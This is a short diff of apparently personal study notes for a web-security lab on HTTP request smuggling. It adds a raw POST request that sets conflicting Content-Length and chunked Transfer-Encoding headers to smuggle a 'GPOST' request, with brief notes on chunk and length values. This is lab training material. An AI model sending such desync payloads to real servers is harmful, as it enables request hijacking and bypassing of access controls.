@@ -65,12 +65,33 @@ G
 
 ```
 
-
 send normal request
 
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+56
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+
+0
 
 
+```
 
+
+56 --> ![[Pasted image 20240815110132.png]]
+
+CL1 ->  ![[Pasted image 20240815110239.png]]
+
+CL2 -> ![[Pasted image 20240815110330.png]]
+
+5+1 = 6
 
 
 
